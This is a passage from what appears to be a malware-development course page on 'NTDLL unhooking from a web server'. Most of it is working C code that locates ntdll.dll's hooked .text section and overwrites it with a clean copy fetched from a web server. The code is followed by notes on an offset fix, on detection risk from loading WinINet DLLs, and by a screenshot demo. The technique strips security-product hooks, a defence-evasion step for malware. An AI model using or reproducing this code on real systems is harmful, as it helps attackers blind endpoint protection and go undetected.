	PVOID			   pLocalNtdll 	   = (PVOID)FetchLocalNtdllBaseAddress();


	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr 	= (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS 	pLocalNtHdrs 	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID     pLocalNtdllTxt    = NULL, // local hooked text section base address
	          pRemoteNtdllTxt   = NULL; // the unhooked text section base address
	SIZE_T    sNtdllTxtSize     = NULL; // the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, &quot;.text&quot;) == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == &#x27;xet.&#x27;) {

			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that &#x27;pRemoteNtdllTxt&#x27; is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		// if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
		(ULONG_PTR)pRemoteNtdllTxt += 3072;
		// checking again
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
			return FALSE;
	}


//---------------------------------------------------------------------------------------------------------------------------

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [1] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// copying the new text section
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [2] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	return TRUE;
}
</code></pre><p id="1f39ab54-d6d5-40c2-8ae1-e63a6d81c969" class="">Even though the ntdll.dll file is <em>read</em> from a WebServer, the offset of the text section can be <code>4096</code>, and since this assumption can&#x27;t be validated until runtime, an if-statement is added to verify this possibility and work upon it by adding <code>3072</code> bytes to the miscalculated base address (because <code>1024</code> bytes were already added).</p><p id="f8459532-dfa9-4b85-b2d7-828476d4b5a1" class="">The result is a base address of a text section of offset <code>4096</code>. This logic was introduced in the <em>Ntdll Unhooking - From Disk</em> module.</p><h3 id="68202cc1-6b9b-4fda-ae00-9952d8ba376b" class=""><strong>Risk Consideration</strong></h3><p id="0be748e6-938e-45cf-82b8-c1c2790e84ef" class="">Although this NTDLL unhooking approach may appear a good approach at first, it is considered risky due to the usage of the <a href="https://learn.microsoft.com/en-us/windows/win32/wininet/about-wininet">WinINet</a> APIs. These APIs are used to interact with the HTTP/S protocol, but they require loading additional DLL images such as <code>wininet.dll</code>, <code>winhttp.dll</code>, <code>sechost.dll</code>, and many other DLLs that export functions used by these WinINet APIs. Loading these DLLs is done using functions that are likely being hooked such as <code>LoadLibrary</code> and <code>LdrLoadDll</code>, which exposes the inner design of the implementation.</p><h3 id="a5b84647-9c15-4a13-a544-1a42b0d6e0c7" class=""><strong>Demo</strong></h3><p id="d457c276-5547-4f01-9d8e-acb5dd1b6c58" class="">Downloading the <code>ntdll.dll</code> file from Winbindex.</p><figure id="1723a247-37ed-4bc6-a78b-7e83676eba0e" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-718816620-fdcedd74-65d6-49a9-b7b8-b83eb8d59b68.png"><img style="width:1855px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-718816620-fdcedd74-65d6-49a9-b7b8-b83eb8d59b68.png"/></a></figure><p id="b9db3181-953d-4414-a152-1ba4846f4df8" class="">The hooked <code>ntdll.dll</code> text section to be replaced.</p><figure id="0db8ebc8-df46-4a62-b2fc-c38d3529d308" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-818817840-42eb37ed-c3fb-4bfc-a990-a79ea05fc69a.png"><img style="width:1537px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-818817840-42eb37ed-c3fb-4bfc-a990-a79ea05fc69a.png"/></a></figure><p id="3d52e5f8-9421-4677-91be-d3f127df53a8" class="">Miscalculating the text section base address.</p><figure id="f9a8a3b2-b4de-4d1e-9d38-6a48078e82ae" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-918817843-e8ec2cca-a951-40e3-af75-14129cab4db5.png"><img style="width:1546px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-918817843-e8ec2cca-a951-40e3-af75-14129cab4db5.png"/></a></figure><p id="e7eedd99-fda0-423a-805d-6b55c81d7dc3" class="">Recalculating the base address.</p><figure id="5f6e56ce-892b-497a-b5d6-12e3d091a9fa" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-10.png"><img style="width:1551px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-10.png"/></a></figure><p id="bd862872-f478-48e9-af2b-c87d8ed845e4" class="">Replacing the text section.</p><figure id="6a675ce7-9d38-4ebd-9f6c-1ba3c13a578e" class="image"><a href="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-11.png"><img style="width:1560px" src="87%20NTDLL%20Unhooking%20-%20From%20a%20Web%20Server%20d1bcc5c3167c43088e31dd211efded76/ntdll-unhooking-server-11.png"/></a></figure></div></article></body></html>